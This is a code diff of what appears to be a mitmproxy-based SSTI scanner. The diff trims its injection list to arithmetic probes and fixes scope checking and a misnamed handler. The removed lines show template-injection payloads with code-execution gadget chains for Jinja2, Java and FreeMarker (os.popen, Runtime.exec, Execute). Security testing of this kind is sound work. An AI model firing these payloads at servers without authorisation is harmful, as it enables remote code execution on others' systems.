@@ -17,7 +17,7 @@ class SSTIResponse:
         os.makedirs(self.flow_dir_ssti, exist_ok=True)
         self.hashes_file_path = os.path.join(self.flow_dir_ssti, "request_hashes.txt")
         self.processed_requests = self.load_processed_requests()
-        self.alteration_indicators_ssti = ["{{95459879*95459879}}", "${95459879*95459879}", "<%= 95459879*95459879 %>", "#{95459879*95459879}", "*{95459879*95459879}", "{{'95459879'|multiply('95459879')}}", "{math equation=\"95459879*95459879\"}", "{{config.items()}}", "#set($x = 95459879*95459879)", "<#assign x=95459879*95459879>${x}", "${95459879*95459879}", "${95459879*95459879}", "{{95459879*'95459879'}}", "{{95459879*'95459879'}}", "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('95459879*95459879').read()}}", "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('95459879*95459879').read()}}", "{{config.__class__.__init__.__globals__['os'].popen('95459879*95459879').read()}}", "{{''.__class__.mro()[2].__subclasses__()[40]('95459879*95459879').read()}}", "{{''.__class__.mro()[1].__subclasses__()[396]('95459879*95459879',shell=True,stdout=-1).communicate()}}", "<%= debug('95459879*95459879') %>", "#{T(java.lang.Runtime).getRuntime().exec('95459879*95459879')}", "#if($x == '95459879*95459879')true#{end}", "<#list .data_model?keys as key>${'95459879*95459879'}</#list>", "<#assign command=\"freemarker.template.utility.Execute\"?new()>${command('95459879*95459879')}", "${\"freemarker.template.utility.Execute\"?new()('95459879*95459879')}", "{{95459879*'95459879'}}", "{{ '95459879'*95459879 }}", "{{request.application.__globals__.__builtins__.__import__('os').popen('95459879*95459879').read()}}", "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('95459879*95459879')['read']()}}", "{{''.__class__.__mro__[2].__subclasses__()[40]('95459879*95459879').read()}}", "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null, '95459879*95459879')}"]
+        self.alteration_indicators_ssti = ["{{95459879*95459879}}", "${95459879*95459879}", "<%= 95459879*95459879 %>", "#{95459879*95459879}", "*{95459879*95459879}", "{{'95459879'|multiply('95459879')}}", "${95459879*95459879}", "${95459879*95459879}", "{{95459879*'95459879'}}", "{{95459879*'95459879'}}", "{{95459879*'95459879'}}", "{{ '95459879'*95459879 }}"]
         self.altered_header_ssti = "x-altered-ssti"
         self.params_string = ""
 
@@ -42,9 +42,9 @@ class SSTIResponse:
     def response(self, flow: http.HTTPFlow) -> None:
 
         #in Scope
-        Hostscope = flow.request.headers.get("Host", "")
-        if self.scope not in Hostscope:
-            return
+        parsed_url = urlparse(flow.request.url)
+        if self.scope not in parsed_url.hostname:
+            return  
 
         
          #--- first phase check the method request ---
@@ -80,7 +80,7 @@ class SSTIResponse:
 
             for key, content in all_processed_items.items():
                 if str(content) in flow.response.text:
-                    self.handle_reflection_ssrf(flow, key)
+                    self.handle_reflection_ssti(flow, key)
 
 
         elif method == "GET":
@@ -102,10 +102,10 @@ class SSTIResponse:
 
                         for key, content in all_processed_items.items():
                             if str(content) in flow.response.text:
-                                self.handle_reflection_ssrf(flow, key, decoded_json, orginalgetparam)
+                                self.handle_reflection_ssti(flow, key, decoded_json, orginalgetparam)
                 except:
                     if str(value) in flow.response.text:
-                        self.handle_reflection_ssrf(flow, param)
+                        self.handle_reflection_ssti(flow, param)
 
 
     # ---- -------------------end of the function------------------ ------- -----------
@@ -159,7 +159,7 @@ class SSTIResponse:
 
 #---- ----------handle reflection function -----------------------------
 
-    def handle_reflection_ssrf(self, flow, param, dictoniry=None, orginalgetparam=None):
+    def handle_reflection_ssti(self, flow, param, dictoniry=None, orginalgetparam=None):
         with ThreadPoolExecutor(max_workers=100) as executor:
             # Logic to handle the reflection, e.g., logging, altering, and replaying
             for indicator in self.alteration_indicators_ssti:
@@ -294,4 +294,3 @@ class SSTIResponse:
         
 
 addons = [SSTIResponse()]
-
